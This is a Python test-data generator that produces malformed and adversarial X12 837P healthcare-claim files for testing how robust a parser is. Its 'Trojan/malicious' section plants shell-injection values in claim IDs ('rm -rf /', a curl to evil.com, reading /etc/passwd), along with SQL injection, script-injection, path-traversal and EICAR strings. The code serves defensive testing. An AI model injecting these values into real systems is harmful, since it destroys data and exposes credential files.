"""Generate adversarial EDI test files for robustness testing.

Produces files covering failure scenarios, corrupted data, and
trojan/malicious content to test parser resilience.
"""
from __future__ import annotations

import os
import random

from .generate_837p import _build_837p_claims


def _base_837p() -> str:
    """Generate a small valid 837P as the base for adversarial mutations."""
    random.seed(42)
    return _build_837p_claims(5)


def generate_adversarial_files(output_dir: str) -> dict[str, str | bytes]:
    """Produce adversarial test files and return a mapping of filename -> content.

    Files are also written to output_dir if provided.
    The returned dict values are str for text files, bytes for binary files.

    Args:
        output_dir: Directory to write generated files. Created if needed.
    """
    os.makedirs(output_dir, exist_ok=True)
    files: dict[str, str | bytes] = {}
    base = _base_837p()
    segments = base.split("~")

    # -----------------------------------------------------------------------
    # Failure scenarios
    # -----------------------------------------------------------------------

    # truncated_mid_segment.x12 — cut at 60% of a segment
    mid = len(base) * 6 // 10
    # Find middle of a segment (not at a ~ boundary)
    while mid < len(base) and base[mid] == "~":
        mid += 1
    files["truncated_mid_segment.x12"] = base[:mid]

    # missing_iea.x12 — remove IEA segment
    segs_no_iea = [s for s in segments if s and not s.startswith("IEA")]
    files["missing_iea.x12"] = "~".join(segs_no_iea) + "~"

    # missing_gs_ge.x12 — remove GS and GE segments
    segs_no_gs_ge = [s for s in segments if s and not s.startswith("GS") and not s.startswith("GE")]
    files["missing_gs_ge.x12"] = "~".join(segs_no_gs_ge) + "~"

    # wrong_se_count.x12 — SE count set to 999
    wrong_se = base.replace("SE*", "SE_MARKER*", 1)
    parts = wrong_se.split("SE_MARKER*")
    if len(parts) == 2:
        se_rest = parts[1]
        # Replace the count (first element after SE*)
        se_elements = se_rest.split("*", 1)
        fixed = parts[0] + "SE*999*" + se_elements[1] if len(se_elements) > 1 else wrong_se
        files["wrong_se_count.x12"] = fixed
    else:
        files["wrong_se_count.x12"] = base.replace("SE*", "SE*999*", 1)

    # wrong_ge_count.x12 — GE group count set to 5
    files["wrong_ge_count.x12"] = base.replace("GE*1*", "GE*5*")

    # wrong_iea_count.x12 — IEA interchange count set to 10
    files["wrong_iea_count.x12"] = base.replace("IEA*1*", "IEA*10*")

    # invalid_isa_version.x12 — ISA12 set to 00399
    files["invalid_isa_version.x12"] = base.replace("*00501*", "*00399*", 1)

    # invalid_gs_version.x12 — GS08 set to 004010X098
    files["invalid_gs_version.x12"] = base.replace(
        "005010X222A1", "004010X098A1", 1
    )

    # empty_file.x12 — 0 bytes
    files["empty_file.x12"] = ""

    # json_as_x12.x12
    files["json_as_x12.x12"] = (
        '{"ISA": {"sender": "TEST", "receiver": "TEST"}, '
        '"GS": {"functional_id": "HC"}, '
        '"claims": [{"id": "CLM001", "amount": 100.00}]}'
    )

    # xml_as_x12.x12
    files["xml_as_x12.x12"] = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<X12 xmlns="urn:x12:schema">\n'
        '  <ISA><sender>TEST</sender><receiver>TEST</receiver></ISA>\n'
        '  <GS functional_id="HC"/>\n'
        '  <claim id="CLM001" amount="100.00"/>\n'
        '</X12>'
    )

    # plaintext_as_x12.x12
    files["plaintext_as_x12.x12"] = (
        "Lorem ipsum dolor sit amet, consectetur adipiscing elit. "
        "Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. "
        "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris "
        "nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in "
        "reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla "
        "pariatur. Excepteur sint occaecat cupidatat non proident, sunt in "
        "culpa qui officia deserunt mollit anim id est laborum."
    )

    # -----------------------------------------------------------------------
    # Corrupted files
    # -----------------------------------------------------------------------

    # binary_noise.x12 — 100 random bytes injected at offset 200
    base_bytes = base.encode()
    random.seed(42)
    noise = bytes(random.randint(0, 255) for _ in range(100))
    offset = min(200, len(base_bytes))
    files["binary_noise.x12"] = base_bytes[:offset] + noise + base_bytes[offset:]

    # null_bytes.x12 — \x00 between every 5th segment
    null_segs = segments[:]
    for i in range(4, len(null_segs), 5):
        if null_segs[i]:
            null_segs[i] = null_segs[i] + "\x00"
    files["null_bytes.x12"] = "~".join(null_segs) + "~"

    # mixed_delimiters.x12 — random tab/pipe instead of */~
    random.seed(42)
    mixed = list(base)
    for i in range(len(mixed)):
        if mixed[i] == "*" and random.random() < 0.3:
            mixed[i] = random.choice(["\t", "|"])
        elif mixed[i] == "~" and random.random() < 0.3:
            mixed[i] = random.choice(["\t", "|"])
    files["mixed_delimiters.x12"] = "".join(mixed)

    # utf8_bom.x12 — prepend UTF-8 BOM
    files["utf8_bom.x12"] = b"\xef\xbb\xbf" + base.encode()

    # double_terminators.x12 — ~~ instead of ~
    files["double_terminators.x12"] = base.replace("~", "~~")

    # oversized_element.x12 — NM1 last name set to 'A' * 100000
    files["oversized_element.x12"] = base.replace(
        "BENCHMARK MEDICAL GROUP", "A" * 100000, 1
    )

    # -----------------------------------------------------------------------
    # Trojan/malicious
    # -----------------------------------------------------------------------

    # shell_injection.x12
    shell_base = _base_837p()
    shell_base = shell_base.replace(
        "CLM0000001", "; rm -rf /", 1
    ).replace(
        "CLM0000002", "$(curl evil.com)", 1
    ).replace(
        "CLM0000003", "`cat /etc/passwd`", 1
    )
    files["shell_injection.x12"] = shell_base

    # sql_injection.x12
    sql_base = _base_837p()
    sql_base = sql_base.replace(
        "BENCHMARK MEDICAL GROUP",
        "'; DROP TABLE claims; --",
        1,
    ).replace(
        "BENCHMARK INSURANCE CO",
        "1 OR 1=1",
        1,
    ).replace(
        "EDI DEPARTMENT",
        "' UNION SELECT * FROM users --",
        1,
    )
    files["sql_injection.x12"] = sql_base

    # script_injection.x12
    script_base = _base_837p()
    script_base = script_base.replace(
        "BENCHMARK MEDICAL GROUP",
        '<script>alert(1)</script>',
        1,
    ).replace(
        "EDI DEPARTMENT",
        'javascript:void(0)',
        1,
    ).replace(
        "100 MAIN STREET",
        '<img src=x onerror=alert(1)>',
        1,
    )
    files["script_injection.x12"] = script_base

    # path_traversal.x12
    path_base = _base_837p()
    path_base = path_base.replace(
        "CLM0000001", "../../etc/passwd", 1
    ).replace(
        "CLM0000002", "..\\..\\windows\\system32", 1
    ).replace(
        "CLM0000003", "/dev/null", 1
    )
    files["path_traversal.x12"] = path_base

    # oversized_field_1mb.x12 — single element with 1MB
    mb_base = _base_837p()
    mb_base = mb_base.replace(
        "BENCHMARK MEDICAL GROUP",
        "X" * (1024 * 1024),
        1,
    )
    files["oversized_field_1mb.x12"] = mb_base

    # eicar_embedded.x12 — EICAR test string in REF segment
    eicar_base = _base_837p()
    eicar_string = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    eicar_base = eicar_base.replace(
        "REF*EI*", f"REF*EI*{eicar_string}~REF*ZZ*", 1
    )
    files["eicar_embedded.x12"] = eicar_base

    # -----------------------------------------------------------------------
    # Write files
    # -----------------------------------------------------------------------
    for filename, content in files.items():
        filepath = os.path.join(output_dir, filename)
        if isinstance(content, bytes):
            with open(filepath, "wb") as f:
                f.write(content)
        else:
            with open(filepath, "w") as f:
                f.write(content)

    return files
